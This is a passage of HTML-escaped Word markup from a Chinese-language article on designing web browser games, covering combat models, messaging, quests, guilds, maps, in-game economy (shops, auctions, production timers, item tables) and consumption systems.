style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1 NPC&lt;br /&gt;\r\nN&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs N NPC&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nN&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;N&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs N&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;比如，无心宠物，就包括了&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;vs 1 NPC&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;vs 1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;比如，战神世界，就包括了&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;vs 1 NPC&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;vs 1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nN&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt; vs 1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;团队&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;3&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;、消息系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;短信息，系统通知，游戏内邮件等等。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;b&gt;4&lt;/b&gt;&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;、任务系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;任务系统是对以上系统功能的集合。有了功能，自然就有了任务发挥的空间。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;b&gt;5&lt;/b&gt;&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;、公会系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;游戏始终是人跟人玩。所以公会系统是重中之重。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;b&gt;6&lt;/b&gt;&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;、地图系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;虚拟的世界环境。可以是复杂的图片地图，也可以只是几个数字。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;分析&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:14.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;6&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;类系统到底是做什么&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:14.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、经济系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;相信大多数开发者都做过电子商务类型的网站吧，要不商店类型的网站做过吧。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;再不然，一个产品列表总做过吧。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nok,&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;网页游戏中的&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;商店&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;跟一般的网站商店非常类似，而且可能更简单，因为你不需要购物车。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;拍卖行&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，如果你用过淘宝、易趣的拍卖功能，你就知道是怎么回事了。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;经济系统的难点是：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;生产或打工场所&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;道具和资源&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;生产或打工场所&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;你至少需要完成一个计时器，一个生产类，一个打工类。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;生产类和打工类都只需要有：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;开始&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;() &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;过程&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;() &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;结束&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;()&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;开始&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;():&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;数据初始化。如判断体力是否够啊。材料是否够啊之类的。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;过程&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;():&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;可以什么都不做。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;结束&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;():&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;产生了什么产品。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;计时器用来配合处理什么时候执行开始&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，什么时候执行结束&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;道具和资源：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;道具最好整合到一个表里。加上如&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;itemtype&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;（道具类型），&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;itemaddtype&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;（道具增加属性类型），&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;itemaddpoint&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;（道具增加点数）之类的字段。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;你可以很好的处理装备、药品等等。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;2&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、消耗系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;消耗系统比经济系统复杂。因为它涉及到一个个具体的功能模型。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;比如&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;玩家&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;vs 1 NPC&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;的模型。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;你可以通过纯&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;js&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;处理，也可以通过&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;ajax&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;配合后台编程语言处理。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;比如一个完整的过程：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、获得初始数据。开始计时。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n2&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、模型过程。比如攻击一次，攻击&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;XX&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;个回合。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span 